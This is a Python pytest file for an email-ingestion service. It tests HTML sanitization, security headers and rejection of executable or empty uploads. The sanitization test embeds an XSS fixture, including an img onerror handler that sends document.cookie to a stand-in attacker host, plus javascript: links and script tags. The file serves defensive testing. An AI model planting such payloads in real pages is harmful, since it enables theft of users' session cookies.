import pytest
from httpx import AsyncClient, ASGITransport
from app.main import app
from app.services.ingestion import IngestionService

@pytest.mark.asyncio
async def test_xss_email_body_sanitization():
    raw_xss_eml = b"""From: attacker@evil.com
To: victim@company.com
Subject: Malicious XSS Payload
Content-Type: text/html; charset="UTF-8"

<html>
<body>
<h1>Phishing Header</h1>
<script>alert('XSS-EXPLOIT');</script>
<img src="invalid" onerror="document.location='http://attacker.com/steal?c='+document.cookie" />
<iframe src="javascript:alert(1)"></iframe>
<a href="javascript:alert('CLICK-XSS')">Click Here</a>
<a href="https://safe-banking.com">Safe Link</a>
</body>
</html>
"""
    parsed = IngestionService.parse_raw_email(raw_xss_eml, source="security_test")
    sanitized_html = parsed["body_html"]

    # Verify harmful script tags and event handlers are neutralized
    assert "<script>" not in sanitized_html
    assert "onerror=" not in sanitized_html
    assert "<iframe" not in sanitized_html
    assert 'href="javascript:' not in sanitized_html

    # Verify safe HTML elements and valid HTTPS links remain intact
    assert "<h1>Phishing Header</h1>" in sanitized_html
    assert 'href="https://safe-banking.com"' in sanitized_html

@pytest.mark.asyncio
async def test_security_headers_present():
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        response = await client.get("/health")
        assert response.status_code == 200
        
        headers = response.headers
        assert headers.get("x-content-type-options") == "nosniff"
        assert headers.get("x-frame-options") == "DENY"
        assert headers.get("x-xss-protection") == "0"
        assert "strict-transport-security" in headers
        assert "content-security-policy" in headers
        assert "referrer-policy" in headers

@pytest.mark.asyncio
async def test_unsupported_file_upload_rejected():
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        files = {"file": ("malware.exe", b"MZ\x90\x00\x03", "application/x-msdownload")}
        response = await client.post("/api/v1/emails/upload", files=files)
        assert response.status_code == 400
        assert "Unsupported file type" in response.json()["detail"]

@pytest.mark.asyncio
async def test_empty_file_upload_rejected():
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        files = {"file": ("empty.eml", b"", "message/rfc822")}
        response = await client.post("/api/v1/emails/upload", files=files)
        assert response.status_code == 400
        assert "Uploaded file is empty" in response.json()["detail"]
